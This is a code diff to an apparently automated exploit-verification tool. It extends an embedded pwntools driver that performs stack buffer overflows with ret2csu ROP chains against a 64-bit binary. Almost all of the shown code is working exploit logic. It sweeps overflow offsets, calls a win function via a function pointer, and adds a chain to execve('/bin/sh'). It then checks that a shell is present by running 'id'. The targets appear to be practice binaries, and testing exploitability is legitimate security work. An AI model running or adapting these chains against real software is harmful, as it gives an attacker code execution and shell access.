@@ -17,7 +17,7 @@ from ._sandbox import run_driver
 
 _DRIVER = r'''
 import sys, time
-from pwn import ELF, context, p64, process
+from pwn import ELF, ROP, context, p64, process
 name = sys.argv[1]
 context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
 if elf.bits != 64:
@@ -34,54 +34,67 @@ RET = find(bytes([0xc3]))        # a bare `ret` for 16-byte stack re-alignment (
 if G1 is None or G2 is None or RET is None:
     print("NOT_APPLICABLE (no __libc_csu_init-style gadgets found)"); sys.exit(1)
 
-# a pointer in writable/known memory holding the address of a callable target. Prefer a symbol
-# named 'fnptr' (practice targets), else any .data/.got qword that points into executable code.
-target_ptr = None
-win = elf.symbols.get("win")
-if "fnptr" in elf.symbols:
-    target_ptr = elf.symbols["fnptr"]
-if target_ptr is None:
-    print("NOT_APPLICABLE (no known function pointer to call via [r12+rbx*8])"); sys.exit(1)
-
-A1, A2, A3 = 0x1337, 0xdead, 0xbeef          # sentinels the practice win() checks
 MARK = b"BINORACLE_CSU_PWNED"
+_OFFS = [72, 64, 88, 56, 96, 80, 104, 120, 40, 48]
 
-def chain(align):
-    c  = p64(RET) * align   # 0 or 1 extra `ret` to flip 16-byte alignment for glibc's MOVAPS
-    c += p64(G1)
-    c += p64(0)          # rbx = 0  (index: call [r12 + 0])
-    c += p64(1)          # rbp = 1  (csu loop: after inc rbx==rbp -> stop; harmless if no loop)
-    c += p64(target_ptr) # r12 = &fnptr
-    c += p64(A1)         # r13 -> edi (arg1)
-    c += p64(A2)         # r14 -> rsi (arg2)
-    c += p64(A3)         # r15 -> rdx (arg3)
-    c += p64(G2)         # gadget2: set rdx/rsi/edi, call [r12+rbx*8] = fnptr = win
-    # after win() returns, gadget2's own `ret` (or the csu epilogue) consumes more slots; pad with
-    # the gadget1 address again as a benign landing so a trailing `ret` doesn't crash before the shell
-    c += p64(G1) + p64(0) * 6
-    return c
-
-# the needed alignment depends on the overflow offset's parity, so sweep both ret-slides
-for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48]:
-    for align in (0, 1):
-        io = None
+def run(payload):
+    io = None
+    try:
+        io = process([name])
+        try: io.recvrepeat(0.2)
+        except Exception: pass
+        io.send(payload); time.sleep(0.3)
+        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
+        out = b""
+        try: out = io.recvrepeat(1.2)
+        except Exception: pass
+        io.close()
+        return (MARK in out) or (b"uid=" in out)
+    except Exception:
         try:
-            io = process([name])
-            try: io.recvrepeat(0.2)
-            except Exception: pass
-            io.send(b"A" * off + chain(align)); time.sleep(0.3)
-            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
-            out = b""
-            try: out = io.recvrepeat(1.2)
-            except Exception: pass
-            io.close()
-            if MARK in out or b"uid=" in out:
-                print("VERIFIED off=%d align=%d g1=%#x g2=%#x fnptr=%#x" % (off, align, G1, G2, target_ptr))
+            if io: io.close()
+        except Exception: pass
+        return False
+
+# --- strategy A: csu gadget2 calls a function pointer (fnptr) with 3 controlled args (win(a,b,c)) --
+win = elf.symbols.get("win")
+fnptr = elf.symbols.get("fnptr")
+if fnptr is not None and win is not None:
+    A1, A2, A3 = 0x1337, 0xdead, 0xbeef          # sentinels the practice win() checks
+    def chain_win(align):
+        c  = p64(RET) * align
+        c += p64(G1) + p64(0) + p64(1) + p64(fnptr) + p64(A1) + p64(A2) + p64(A3)
+        c += p64(G2) + p64(G1) + p64(0) * 6
+        return c
+    for off in _OFFS:
+        for align in (0, 1):
+            if run(b"A" * off + chain_win(align)):
+                print("VERIFIED mode=win off=%d align=%d g1=%#x g2=%#x fnptr=%#x" % (off, align, G1, G2, fnptr))
                 sys.exit(0)
-        except Exception:
-            try:
-                if io: io.close()
-            except Exception: pass
+
+# --- strategy B: ret2csu -> execve. Use csu to set rsi=0 / rdx=0 (no pop rsi/rdx), with gadget2's
+# forced call aimed at a benign `ret` pointer, then pop rdi=&binsh, pop rax=59, syscall. ----------
+binsh = next(elf.search(b"/bin/sh\x00"), None)
+rop = ROP(elf)
+try: pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
+except Exception: pop_rdi = None
+try: pop_rax = rop.find_gadget(["pop rax", "ret"]).address
+except Exception: pop_rax = None
+_sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+syscall = _sc.address if _sc else None
+# a pointer whose target just returns: the 'retptr' symbol, else build one is not possible here.
+benign_ptr = elf.symbols.get("retptr")
+if binsh and pop_rdi and pop_rax and syscall and benign_ptr is not None:
+    def chain_execve():
+        c  = p64(G1) + p64(0) + p64(1) + p64(benign_ptr) + p64(0) + p64(0) + p64(0)  # rsi=0, rdx=0
+        c += p64(G2)                                   # sets rsi/rdx, benign call, returns
+        c += p64(pop_rdi) + p64(binsh) + p64(pop_rax) + p64(59) + p64(syscall)       # execve('/bin/sh',0,0)
+        return c
+    for off in _OFFS:
+        if run(b"A" * off + chain_execve()):
+            print("VERIFIED mode=execve off=%d g1=%#x g2=%#x syscall=%#x binsh=%#x" % (off, G1, G2, syscall, binsh))
+            sys.exit(0)
+
 print("NOT_VERIFIED")
 sys.exit(1)
 '''
